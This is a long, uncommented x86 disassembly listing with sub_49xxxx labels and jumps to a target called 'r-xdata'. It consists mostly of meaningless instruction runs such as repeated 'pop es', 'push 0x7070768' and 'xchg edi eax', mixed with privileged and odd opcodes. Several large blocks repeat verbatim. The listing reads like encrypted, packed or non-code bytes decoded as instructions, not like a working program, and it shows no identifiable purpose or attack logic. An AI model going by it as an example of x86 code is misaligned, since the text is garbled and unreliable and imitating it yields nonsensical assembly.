sbb eax 0x7e979795
pop ecx
imul ebp [ eax + 0x68 ] 0x1a07545e
adc al bl
insb
push 0x637ec768
dec ecx
push 0xf5fd0768
jle r-xdata
dec esi
push 0x29ff7e68
push 0x7070768
pop es
pop es
pop es
sbb al 0x5f
jg r-xdata
push ds
retn 0x7e4b
nop
push 0x6845917e
push 0x79d21ef1
iretd
push 0x87caaf68
cwde
adc ch [ edi + 0x6e ]
push 0x5b307e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
int 0xfd
in eax 0xf1
push ds
rol [ edi - 0x31 ] cl
int1
push ds
rol [ ebp - 0x3 ] cl
iretd
xchg edi eax
xchg edi eax
pop es
push edx
push 0x90127e68
sub_49044d
test [ edi + 0x7070797 ] edx
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ah [ esi ]
inc ebx
push 0x41217e68
push 0xb3d31e68
mov bh 0x7e
dec [ ebp + 0x7079797 ]
int1
push ds
0x7e27
sub_49056b
push 0x7070707
pop es
pop es
pop es
pop es
leave
pop esi
push esp
pop es
pop es
pop es
pop es
pop es
sbb dl [ edx ]
pop ss
push 0x68
push 0x979eda7e
xchg edi eax
pop es
pop es
pop es
sbb al 0x51
jle r-xdata
pop es
pop es
pop es
sbb bl [ edx ]
daa
push 0x68
push 0x682c597e
push 0x13980707
and eax 0x7e68685b
cwde
xchg edi eax
xchg edi eax
xchg ecx eax
adc [ edi + 0x1c070797 ] 0x6f
jle r-xdata
sub [ eax + 0x68 ] ch
retn 0xd67e
pop es
pop es
pop es
pop es
pop es
sar [ esi - 0x43 ] 0x3a
push 0x7070768
pop es
int1
push ds
fidivr [ ebx - 0x32 ]
jle r-xdata
push esi
push 0xf1f4fd68
push ds
ror [ ebp + 0x1c ] cl
push esi
jle r-xdata
imul esi [ ecx + 0x68 ] 0x7070768
pop es
pop es
vpsrlq ymm7 ymm0 [ esi + 0x2c ]
mov bl 0x97
xchg edi eax
int 0xfd
sar [ esi + 0x2f ] 0x1
jo r-xdata
dec esp
push 0x57a40768
jle r-xdata
mov [ 0x7686843 ] eax
pop es
pop es
pop es
pop es
cwde
adc dl [ edx + 0x51979797 ]
shl [ ebx - 0x38816a79 ] cl
push 0x7070768
pop es
pop es
pop es
pop es
pop es
adc dl [ edi + 0x7e ]
shl [ ebp + 0x7079797 ] cl
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc eax [ edi + 0x7e686846 ]
xchg [ eax + 0x7079797 ] edx
push 0x7070707
pop es
pop es
pop es
pop es
int1
push ds
0x76037e03 0x6868
push ds
0xfbc1686b 0x7ec0
mov dh 0x97
xchg edi eax
mov esp 0x7e871d5f
inc esi
insb
push 0x3f737e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
push ds
pop ds
daa
xchg edi eax
xchg edi eax
pop es
jge r-xdata
dec esi
pop edx
push 0xec7e0768
sahf
xchg edi eax
xchg edi eax
push ds
0x7e63
push 0x8e681407
cwde
adc [ edi + edx * 4 + 0x55149797 ] dl
mov bh 0x7e
push edi
push 0x68
push 0x7070707
pop es
pop es
pop es
pop es
pop es
les ebp [ eax - 0x1d ]
mov bl 0x8f
jle r-xdata
xchg edi eax
jle r-xdata
pop ebx
push 0x7e68a468
daa
jno r-xdata
adc eax 0x9797b693
push 0x7e070707
cmc
pop ebp
push 0x88209868
sbb al 0x65
mov esp 0x89767e58
xchg edi eax
xchg edi eax
cwde
and [ esi + 0x7ea66e14 ] bl
aam 0x7a
push 0x7070768
push 0x97973b01
xchg edi eax
push ds

imul ebp [ eax + 0x68 ] 0x6829d57e
push 0xf2fd0707
jle r-xdata
push ebp
push 0x7e070768
jb r-xdata
leave
sbb al 0x50
enter 0xcb7e 0x79
push 0x7070768
pop es
pop es
pop es
pop es
sbb al 0xeb
sbb dh [ ebx - 0x5c ]
popad
jle r-xdata
push 0xac070707
ficomp [ ebx - 0x496cea68 ]
xchg edi eax
xchg edi eax
je r-xdata
push 0x7070707
push 0x13980768
retn 0x6869
pop es
pop es
pop es
pop es
adc dl [ edi - 0x68 ]
adc edx ecx
test [ edi + 0x28c47e97 ] dl
push 0x7070768
pop es
pop es
pop es
pop es
int1
push ds
fidiv [ ebp + 0x7e ]
mov ah 0x99
xchg edi eax
xchg edi eax
push [ edx ]
daa
push 0x7070707
pop es
pop es
std
in eax 0x1c
push eax
pop es
pop es
pop es
pop es
push 0x7070768
pop es
pop es
pop es
pop es
pop es
adc al 0x53
fwait
jle r-xdata
std
mov ecx 0x65da1ef1
jle r-xdata
adc [ edi - 0xe460269 ] 0x1e
fisub [ ebp + 0x7e ]
jecxz r-xdata
jle r-xdata
mov ss [ edi - 0x35e10e69 ]
xchg edi eax
jle r-xdata
pop es
pop es
jle r-xdata
xchg edi eax
xchg edi eax
int1
push ds
0x7e97
jmp [ eax + ebp * 2 + 0x68 ]
push 0x90209868
jle r-xdata
inc eax
push 0xa7e31e68
fwait
jle r-xdata
push 0x277e68a4
and al 0x68
jle r-xdata
mov dh 0x97
xchg edi eax
pop es
jle r-xdata
imul eax esi 0xffffffc7
js r-xdata
pop es
pop es
pop es
mov ss [ edi + 0x7070797 ]
pop es
pop es
push 0x97973f00
xchg edi eax
adc dl [ edi - 0x68 ]
adc esi edx
test [ edi + 0x6bf21497 ] dl
xchg edi eax
sbb bl dl
pop es
pop es
push 0x7076868
jle r-xdata
xchg edi eax
xchg edi eax
adc al 0xf2
imul edx [ edi - 0x399425e6 ] 0xffffffc7
push 0xc2139807
sub_490600
push 0x6bea1e07
push 0x7ec0fbc1
xchg [ edi ] ebp
push 0xa57e0768
push ecx
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
std
xchg ebx eax
call [ edi + 0x7e9797a7 ]
clc
popad
push 0xa4070768
push edi
leave
int3
sub_4908ea
pushad
push 0x7070768
pop es
pop es
pop es
pop es
pop es
int1
push ds
loop r-xdata
hlt
leave
sbb al 0x49
int1
push ds
0xfd73
sub_490909
push eax
inc ebp
push 0x7070768
sar [ esi - 0x3c ] 0x1
cwde
xchg edi eax
xchg edi eax
pop es
pop es
push 0x277e6be2
mov dl [ edi + 0x7070797 ]
pop es
pop es
jg r-xdata
rcr [ esi ] 0xd1
mov edi [ edi + 0x10 ]
dec ebp
push 0x865aff68
xchg ebp eax
r-xdata
dec ebp
push 0x72937e68
push 0x1e7e0768
insd
push 0x2fce7e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ch [ edx ]
and al 0x68
push 0x68569e7e
push 0xb3d31ec1
mov [ 0x6863d77f ] eax
push 0xb3b3f314
xchg edi eax
into
push ds
shl [ ebx + 0x56967ea3 ] cl
push 0x53140768
xlat
[ ecx - 0x9 ]
jae r-xdata
mov bh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc eax 0x9797b62b
push 0x7ec67b1c
and esp [ eax ]
push 0x7070768
pop es
jg r-xdata
rcl [ ebx + 0x7e ] cl
sub [ esi + 0x68 ] ch
push 0x7070707
cwde
xor eax 0x1c73da1e
shl [ ebx + 0x56 ] cl
outsd
mov [ esi - 0x3f ] bh
jpe r-xdata
push ds
0x7ed1
mov [ edi - 0x233f869 ] dl
jecxz r-xdata
pop es
pop es
adc dl [ edi - 0x68 ]
aas
push 0x4b8d7e68
push 0x7070768
push 0x7e96d01a
dec edx
push 0xc7070768
jle r-xdata
std
xchg edi eax
jle r-xdata
mov dh 0x97
xchg edi eax
push ds
0xcc31
pop es
pop es
pop es
pop es
pop es
std
in eax 0xcc
sbb al 0x69
push esi
js r-xdata
jns r-xdata
int1
jle r-xdata
xchg edi eax
push ds
adc [ ebx - 0x69 ] ecx
xchg edi eax
xchg edi eax
push 0x111e6bc2
dec edi
xchg edi eax
xchg edi eax
adc edi [ edx + edi * 2 + 0x591c6868 ]
push esi
jbe r-xdata
push 0x57120707
cwde
dec esi
xor al 0x68
push 0x7e9fda1c
fldcw [ eax + ebp * 2 + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
les ebp [ eax + 0x1 ]
cmp edx [ edi - 0x3b3f6869 ]
push 0x7f8fb3e3
bound ecx [ ebp + 0x68 ]
push 0x6870957e
push 0xe3680707
mov bl 0x8f
jle r-xdata
push eax
push 0x7070768
int1
push ds
0x88d67e75 0x9797
xchg edi eax
jle r-xdata
jle r-xdata
jge r-xdata
xor eax 0x7076868
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cmpsd [ esi ] [ edi ]
xchg edi edx
jle r-xdata
xchg edi eax
xchg edi eax
pop es
pop es
movsb [ edi ] [ esi ]
push edi
push 0x49da1ef1
sbb al 0x5f
int1
push ds
shl [ ebx + 0x7e ] cl
jpo r-xdata
pop es
or edx [ edi + 0x5ea49797 ]
adc dl [ edi + 0x7e ]
mov dl 0x21
push 0x7b2c7e68
push 0xe2680768
sar [ bp - 0x36 ] 0x27
push 0x607f0768
xchg ecx eax
xchg edi eax
xchg edi eax
into
jle r-xdata
push 0x7b141398
push 0x2d8f7e68
push 0x7070768
pop es
int1
push ds
fidivr [ ecx + 0x7e ]
xchg [ ecx + 0x68 ] esp
push 0x9f209807
jle r-xdata
std
cmp [ esi + 0x31 ] 0xffffff9b
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
xor [ eax + 0x68 ] ch
pop es
pop es
pop es
jle r-xdata
int3
push 0xce070768
into
jle r-xdata
rcl [ edi + 0x7079797 ] 0x7f
fldcw [ ecx + 0x68 ]
push 0x97b7cf7e
xchg edi eax
pop es
jg r-xdata
xchg ecx eax
xchg edi eax
xchg edi eax
das
xchg edi eax
xchg edi eax
xchg edi eax
xlat
cwde
xor eax 0x68326c7e
push 0x7070707
pop es
pop es
pop es
sar [ esi - 0x4b ] 0x33
push 0x7070768
pop es
movsb [ edi ] [ esi ]
dec esp
sbb dl dl
pop es
pop es
pop es
pop es
mov bh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
sub [ ebx - 0x3f68686a ] dl
sbb dl [ edx ]
push esp
pop es
pop es
push 0x7070707
pop es
pop es
pop es
pop es
and ebp [ edi + 0x68 ]
push 0x978d937e
xchg edi eax
pop es
pop es
pop es
pop es
pop ds
retn
xchg edi eax
xchg edi eax
rcr [ edx ] 0x12
push 0x7076868
ror bl cl
mov bh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop ss
jle r-xdata
mov dl [ edi - 0x2de13169 ]
imul edi [ esi + 0x27 ] 0x47
push 0x7e7b1c68
pop ebp
nop
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int 0x7e
lahf
xchg edi eax
xchg edi eax
push [ ebp - 0x3fe2d76b ]
jg r-xdata
pop es
pop es
push 0x97975320
xchg edi eax
jle r-xdata
pop es
pop es
pop es
pop es
std
in eax 0x7e
stc
jo r-xdata
mov edx [ edi + 0x7070797 ]
cmpsd [ esi ] [ edi ]
jpe r-xdata
inc eax
push 0xce4f1c68
jle r-xdata
pop es
pop es
inc esp
insb
jle r-xdata
push 0x5e070707
push esp
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
pop es
pop es
rol edi 0x7e
xor al 0x68
cmp eax 0x7076868
pop es
jle r-xdata
and ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
push 0xd07e6bd2
and al 0x68
push 0x367ecece
cmp eax 0x1c076868
retn
push 0x7070707
sbb al 0x4d
int1
push ds
0x7e6b
dec ebp
push 0x7070768
pop es
pop es
pop es
pop es
jle r-xdata
push ecx
push 0x68
push 0x7070707
pop es
push 0xe7f9fe2
push 0x5ecece68
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
std
sub ebp [ eax + 0x68 ]
movsb [ edi ] [ esi ]
push edi
jle r-xdata
push esi
push 0xf1070768
push ds
retn 0xf171
imul ebp [ eax + 0x68 ] 0x7070707
pop es
pop es
pop es
pop es
cwde
adc al [ esi + 0x7e686854 ]
xchg ebx eax
sub ch [ eax + 0x68 ]
pop es
pop es
int1
push ds
retn 0x7e5d
push 0x7e57a468
cli
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sub_490acc
std
xchg edi eax
push ds
adc [ ebx - 0x69 ] ecx
xchg edi eax
xchg edi eax
push 0x111e6bc2
dec edi
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
les ebp [ eax + 0x1 ]
cmp edx [ edi - 0x3b3f6869 ]
push 0x7f8fb3e3
bound ecx [ ebp + 0x68 ]
push 0x6870957e
push 0xe3680707
mov bl 0x8f
jle r-xdata
push eax
push 0x7070768
int1
push ds
0x88d67e75 0x9797
jge r-xdata
xor eax 0x7076868
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cmpsd [ esi ] [ edi ]
xchg edi edx
jle r-xdata
pop es
or edx [ edi + 0x5ea49797 ]
adc dl [ edi + 0x7e ]
mov dl 0x21
push 0x7b2c7e68
push 0xe2680768
sar [ bp - 0x36 ] 0x27
push 0x607f0768
xchg ecx eax
xchg edi eax
xchg edi eax
into
jle r-xdata
push 0x7b141398
push 0x2d8f7e68
push 0x7070768
pop es
int1
push ds
fidivr [ ecx + 0x7e ]
xchg [ ecx + 0x68 ] esp
push 0x9f209807
jle r-xdata
std
cmp [ esi + 0x31 ] 0xffffff9b
xchg edi eax
xchg edi eax
pop es
pop es
pop es
push 0x97975320
xchg edi eax
jle r-xdata
rcl [ edi + 0x7079797 ] 0x7f
fldcw [ ecx + 0x68 ]
push 0x97b7cf7e
xchg edi eax
pop es
jg r-xdata
xchg ecx eax
xchg edi eax
xchg edi eax
das
xchg edi eax
xchg edi eax
xchg edi eax
xlat
cwde
xor eax 0x68326c7e
push 0x7070707
pop es
pop es
pop es
sar [ esi - 0x4b ] 0x33
push 0x7070768
pop es
movsb [ edi ] [ esi ]
dec esp
sbb dl dl
pop es
pop es
pop es
pop es
mov bh 0x97
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
sub [ ebx - 0x3f68686a ] dl
sbb dl [ edx ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
std
in eax 0x7e
stc
jo r-xdata
xor [ eax + 0x68 ] ch
pop es
pop es
pop es
jle r-xdata
pop ss
jle r-xdata
mov dl [ edi - 0x2de13169 ]
imul edi [ esi + 0x27 ] 0x47
push 0x7e7b1c68
pop ebp
nop
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int 0x7e
lahf
xchg edi eax
xchg edi eax
push [ ebp - 0x3fe2d76b ]
jg r-xdata
push esp
pop es
pop es
push 0x7070707
pop es
pop es
pop es
pop es
and ebp [ edi + 0x68 ]
push 0x978d937e
xchg edi eax
pop es
pop es
pop es
pop es
pop ds
retn
xchg edi eax
xchg edi eax
rcr [ edx ] 0x12
push 0x7076868
int3
cmpsd [ esi ] [ edi ]
jpe r-xdata
inc eax
push 0xce4f1c68
jle r-xdata
pop es
pop es
inc esp
insb
jle r-xdata
push 0x5e070707
push esp
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
pop es
pop es
pop es
rol edi 0x7e
xor al 0x68
cmp eax 0x7076868
pop es
jle r-xdata
and ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
push 0xd07e6bd2
and al 0x68
push 0x367ecece
cmp eax 0x1c076868
retn
push 0x7070707
sbb al 0x4d
int1
push ds
0x7e6b
dec ebp
push 0x7070768
pop es
pop es
pop es
pop es
jle r-xdata
push ecx
push 0x68
push 0x7070707
pop es
push 0xe7f9fe2
push 0x5ecece68
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
std
sub ebp [ eax + 0x68 ]
movsb [ edi ] [ esi ]
push edi
jle r-xdata
push esi
push 0xf1070768
push ds
retn 0xf171
imul ebp [ eax + 0x68 ] 0x7070707
pop es
pop es
pop es
pop es
cwde
adc al [ esi + 0x7e686854 ]
xchg ebx eax
sub ch [ eax + 0x68 ]
pop es
pop es
int1
push ds
retn 0x7e5d
push 0x7e57a468
cli
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sub_490cb7
push ds
fisub [ edi + 0x7e ]
sub [ esi + 0x68 ] ebp
push 0x7070707
pop es
pop es
pop es
std
in al 0x7e
pop ecx
jg r-xdata
jmp r-xdata
push 0x71109807
dec edx
push 0x21347e68
push 0xc7e16868
les edi [ esi + 0x43 ]
adc [ edi + 0x7070797 ] 0x7
cwde
adc bh ch
sub ebp [ eax + 0x68 ]
movsb [ edi ] [ esi ]
push edi
jle r-xdata
pop es
inc esp
insb
jle r-xdata
push 0x7e57a468
cli
xchg ebp eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cmp eax 0x7076868
pop es
jle r-xdata
and ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
push 0xd07e6bd2
and al 0x68
push 0x367ecece
cmp eax 0x1c076868
retn
push ecx
push 0x68
push 0x7070707
pop es
push 0xe7f9fe2
push 0x5ecece68
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
imul ebp [ eax + 0x68 ] 0x7070707
pop es
pop es
pop es
pop es
cwde
adc al [ esi + 0x7e686854 ]
xchg ebx eax
sub ch [ eax + 0x68 ]
pop es
pop es
int1
push ds
retn 0x7e5d
sub_490d96
bound esi [ edi ]
push 0x7070768
jle r-xdata
push 0x7070768
pop es
pop es
pop es
pop es
rcr [ esi ] 0xd1
jmp r-xdata
jns r-xdata
pop es
pop es
movsb [ edi ] [ esi ]
push edi
pop esi
push esp
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
shr [ eax - 0x25 ] 0x1
mov bl 0x8f
cwde
adc bh [ ebx ]
ja r-xdata
push 0x7070707
pop es
cwde
adc ebp [ ecx ]
dec ebp
push 0x27c87e68
push 0x6bd21e68
jle r-xdata
arpl [ eax + 0x68 ] bp
jg r-xdata
pop es
adc cl [ eax + ebx * 4 + 0x13 ]
sbb [ esi + 0x68 ] dh
push 0x4bb07ec1
push 0xfd070768
in eax 0x7e
add ebp [ eax ]
push 0x7070768
pop es
pop es
lodsb [ esi ]
push esp
jle r-xdata
sub eax 0x7076868
pop es
pop es
pop es
pop es
pop es
jle r-xdata
jle r-xdata
jb r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xda
lahf
jle r-xdata
and eax 0x7076868
push 0xfd070768
adc ebx [ eax ]
jbe r-xdata
inc esi
push 0x12070768
dec esp
pop es
pop es
pop es
pop es
pop es
adc bl [ esi - 0x68 ]
adc esi esi
inc ebp
push 0x45dd7e68
push 0x41187e68
push 0x7070768
pop es
cwde
push 0x4c120707
push 0xcd1a0768
inc edi
jle r-xdata
inc ebp
stc
int1
push ds
ror [ ebx + 0x682b2c7e ] cl
push 0x1ef1691c
0x617b7e61 0x6868
std
push 0x6829187e
push 0xd21ef107
dec ebx
iretd
daa
push 0x7070768
jle r-xdata
push 0x6841187e
push 0x7070707
push 0x9780877e
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
inc eax
push 0x7070768
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7070768
dec esp
push 0x7070768
pop es
pop es
pop es
pop es
les ebp [ eax - 0x3f ]
sbb [ esi ] 0x2a
inc ebx
push 0x68
push 0x12985712
xlat
push 0x68
push 0x8e97ed7
push 0x7070768
pop es
scasb [ edi ]
0x3fee7e83 0x6868
pop es
pop es
pop es
pop es
cwde
sub [ ebp - 0x6781a76c ] ebp
jg r-xdata
pop es
or [ eax + 0x68 ] ch
pop es
pop es
pop es
pop es
jle r-xdata
push 0x7070768
push ds
jmp r-xdata
push 0xd21c0707
imul ebx [ esi + 0x54 ] 0x7
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp [ ebx + 0x7e68685e ]
clc
pushfd
xchg edi eax
xchg edi eax
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb bl [ edx ]
sbb ebp [ edx + 0x68 ]
sahf
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
and esp edx
mov [ esi + 0x2b ] edi
adc [ edi + 0x7070797 ] 0x7
pop es
pop es
pop es
pop es
les ebx [ edx ]
adc bh [ ebx ]
popad
push 0xdd7ec768
0x7079797 0x707
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ah dh
xor al 0x68
push 0x2a7e57a4
jae r-xdata
imul ebp [ eax + 0x68 ] 0x7070707
pop es
push 0x14070768
push ebx
adc [ edx ] 0x57
jle r-xdata
push 0x50070707
shr [ edi - 0x4b ] cl
mov bh 0xb5
mov dl 0x7e
pop ds
push esi
push 0xc0680768

jle r-xdata
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
pop es
push ds
shl [ ebx - 0x58680041 ] cl
xchg edi eax
xchg edi eax
xchg esp eax
push edi
insd
std
iretd
dec eax
push 0x7ec70768
call [ esi + 0x68 ]
push 0xcf070707
std
mov dl 0x7e
mov ah 0x7d
push 0x7070768
cwde
adc bh [ ebx + 0x21 ]
push 0x51db7e68
push 0x7070768
pop es
jle r-xdata
pop edx
push 0xc0070768
xchg [ edi + 0x7070797 ] edx
pop es
pop es
sbb al 0x50
jle r-xdata
pop es
retn 0xf7e
inc eax
push 0x53877e68
push 0x14070768
push esi
xchg ebp eax
jle r-xdata
shl [ ebx + 0x30747e87 ] cl
push esp
push 0x1e070768
push 0x7070768
pop es
pop es
pop es
pop es
jg r-xdata
pop esp
push 0x33817e68
push 0x63d21e68
jle r-xdata
push 0x7ec1861d
xchg [ edi + 0x7e4f1c97 ] dl
les esi [ esi ]
push 0x7070768
pop es
pop es
pop es
pop es
adc al 0x53
fwait
sub_490e5d
and [ eax + 0x68 ] ch
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
rol [ ebx + 0x7e ] cl
mov edx 0x7686875
pop es
std
adc ebx [ eax ]
jbe r-xdata
inc esi
push 0x12070768
dec esp
daa
push 0x7070768
jle r-xdata
push 0x6841187e
push 0x7070707
push 0x9780877e
xchg edi eax
pop es
pop es
pop es
pop es
jle r-xdata
inc eax
push 0x7070768
pop es
pop es
pop es
pop es
jle r-xdata
and eax 0x7076868
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xda
lahf
jle r-xdata
push 0xfd070768
push 0x7070768
dec esp
push 0x7070768
pop es
pop es
pop es
pop es
les ebp [ eax - 0x3f ]
sbb [ esi ] 0x2a
inc ebx
push 0x68
push 0x12985712
xlat
push 0x68
push 0x8e97ed7
push 0x7070768
pop es
scasb [ edi ]
0x3fee7e83 0x6868
pop es
pop es
pop es
pop es
cwde
sub [ ebp - 0x6781a76c ] ebp
jg r-xdata
pop es
or [ eax + 0x68 ] ch
pop es
pop es
pop es
pop es
jle r-xdata
push 0x6bd21e68
jle r-xdata
arpl [ eax + 0x68 ] bp
jg r-xdata
push 0x7070768
push ds
jmp r-xdata
push 0xd21c0707
imul ebx [ esi + 0x54 ] 0x7
pop es
pop es
pop es
pop es
pop es
cwde
adc ebp [ ebx + 0x7e68685e ]
clc
pushfd
xchg edi eax
xchg edi eax
jle r-xdata
xchg edi eax
pop es
pop es
pop es
pop es
pop es
sbb bl [ edx ]
sbb ebp [ edx + 0x68 ]
sahf
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
and esp edx
mov [ esi + 0x2b ] edi
adc [ edi + 0x7070797 ] 0x7
in eax 0x7e
add ebp [ eax ]
push 0x7070768
pop es
pop es
lodsb [ esi ]
push esp
jle r-xdata
push 0xfd070768
sub eax 0x7076868
pop es
pop es
pop es
pop es
pop es
jle r-xdata
jle r-xdata
jb r-xdata
pop es
pop es
pop es
pop es
les ebx [ edx ]
adc bh [ ebx ]
popad
push 0xdd7ec768
0x7079797 0x707
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ah dh
xor al 0x68
push 0x2a7e57a4
jae r-xdata
imul ebp [ eax + 0x68 ] 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
adc bl [ esi - 0x68 ]
adc esi esi
inc ebp
push 0x45dd7e68
push 0x41187e68
push 0x7070768
pop es
cwde
push 0x4c120707
push 0xcd1a0768
inc edi
jle r-xdata
inc ebp
stc
int1
push ds
ror [ ebx + 0x682b2c7e ] cl
push 0x1ef1691c
0x617b7e61 0x6868
std
push 0x6829187e
push 0xd21ef107
dec ebx
iretd
push 0x14070768
push ebx
adc [ edx ] 0x57
jle r-xdata
push 0x50070707
shr [ edi - 0x4b ] cl
mov bh 0xb5
mov dl 0x7e
pop ds
push esi
push 0xc0680768

jle r-xdata
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
pop es
push ds
shl [ ebx - 0x58680041 ] cl
xchg edi eax
xchg edi eax
xchg esp eax
push edi
insd
std
iretd
dec eax
push 0x7ec70768
call [ esi + 0x68 ]
push 0xcf070707
std
mov dl 0x7e
mov ah 0x7d
push 0x7070768
cwde
adc bh [ ebx + 0x21 ]
push 0x51db7e68
push 0x7070768
pop es
jle r-xdata
pop edx
push 0xc0070768
xchg [ edi + 0x7070797 ] edx
pop es
pop es
sbb al 0x50
jle r-xdata
pop es
retn 0xf7e
inc eax
push 0x53877e68
push 0x14070768
push esi
xchg ebp eax
jle r-xdata
shl [ ebx + 0x30747e87 ] cl
push esp
push 0x1e070768
push 0x7070768
pop es
pop es
pop es
pop es
jg r-xdata
pop esp
push 0x33817e68
push 0x63d21e68
jle r-xdata
push 0x7ec1861d
xchg [ edi + 0x7e4f1c97 ] dl
les esi [ esi ]
push 0x7070768
pop es
pop es
pop es
pop es
adc al 0x53
fwait
sub_490fc8
xchg edi eax
xchg edi eax
pop es
pop es
push 0xe67ea3c1
push 0x7070768
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
push ds
shl [ ebx - 0x2b510e7d ] cl
sar [ esi - 0x60 ] 0x1
dec ecx
push 0x7070768
push ds
jmp r-xdata
pop es
pop es
pop es
pop es
les ebx [ edx ]
adc bh [ ebx ]
popad
push 0xdd7ec768
0x7079797 0x707
pop es
pop es
pop es
pop es
pop es
sub_491016
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
cwde
adc ah dh
xor al 0x68
push 0x2a7e57a4
jae r-xdata
push 0x14070768
push ebx
adc [ edx ] 0x57
jle r-xdata
push 0x50070707
shr [ edi - 0x4b ] cl
mov bh 0xb5
mov dl 0x7e
pop ds
push esi
push 0xc0680768

jle r-xdata
xchg ecx eax
xchg edi eax
xchg edi eax
pop es
pop es
push ds
shl [ ebx - 0x58680041 ] cl
xchg edi eax
xchg edi eax
xchg esp eax
push edi
insd
std
iretd
dec eax
push 0x7ec70768
call [ esi + 0x68 ]
push 0xcf070707
std
mov dl 0x7e
mov ah 0x7d
push 0x7070768
cwde
adc bh [ ebx + 0x21 ]
push 0x51db7e68
push 0x7070768
pop es
jle r-xdata
pop edx
push 0xc0070768
xchg [ edi + 0x7070797 ] edx
pop es
pop es
sbb al 0x50
jle r-xdata
pop es
retn 0xf7e
inc eax
push 0x53877e68
push 0x14070768
push esi
xchg ebp eax
jle r-xdata
shl [ ebx + 0x30747e87 ] cl
push esp
push 0x1e070768
push 0x7070768
pop es
pop es
pop es
pop es
jg r-xdata
pop esp
push 0x33817e68
push 0x63d21e68
jle r-xdata
push 0x7ec1861d
xchg [ edi + 0x7e4f1c97 ] dl
les esi [ esi ]
push 0x7070768
pop es
pop es
pop es
pop es
adc al 0x53
fwait
sub_4910cb
pop es
pop es
pop es
pop es
pop ss
out dx eax
xchg ebp eax
xchg edi eax
jle r-xdata
push 0x7e0768
cwde
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
movsb [ edi ] [ esi ]
push edi
xlat
pop esi
push esp
pop es
pop es
pop es
pop es
int1
push ds
shr [ ebp - 0x3 ] cl
iretd
arpl [ eax + 0x68 ] bp
pop es
sbb al 0x96
sbb al 0xd7
lahf
push ds
shr [ ebx + 0x7e ] cl
or ch [ ecx + 0x68 ]
push 0x63d21ef1
std

sub_491185
push 0x68
push 0x86087ec2
xchg edi eax
xchg edi eax
pop es
sbb al 0xd6
stosd [ edi ]
xchg esp eax
push esi
cwde
adc ecx [ edx + 0x7e686872 ]
push ecx
inc ebx
push 0x7070768
pop es
retn 0x7b1c
sub_4911a6
adc al 0x7b
mov bh 0xc4
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
les edi [ esi - 0x70 ]
imul ebp [ eax + 0x68 ] 0x7070707
insd
push 0xc2070768
jle r-xdata
pop es
les edi [ esi + 0x4c ]
insd
push 0x7070768
pop es
pop es
pop es
pop es
pop es
scasb [ edi ]
0x989b
push 0x7070768
pop es
cmp [ eax + 0x68 ] ch
pop es
pop es
sub_49122f
push 0x98070707
adc al ch
arpl [ eax + 0x68 ] bp
jle r-xdata
